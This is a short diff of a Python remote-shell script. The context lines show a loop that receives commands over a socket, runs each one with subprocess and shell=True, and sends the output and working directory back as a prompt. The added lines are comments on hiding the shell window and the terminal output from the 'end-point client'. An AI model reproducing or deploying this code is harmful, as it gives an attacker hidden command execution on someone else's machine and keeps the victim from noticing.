@@ -12,11 +12,12 @@ while True:
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
     if len(data) > 0:
+        # If you want to hidse the shell window from end-point client change shell to False
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_bytes, "utf-8")
         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-        print(output_str)
+        print(output_str) # optional, comment out if you want to hide the terminal from end-point client (server)
 
 # Close connection
 s.close()
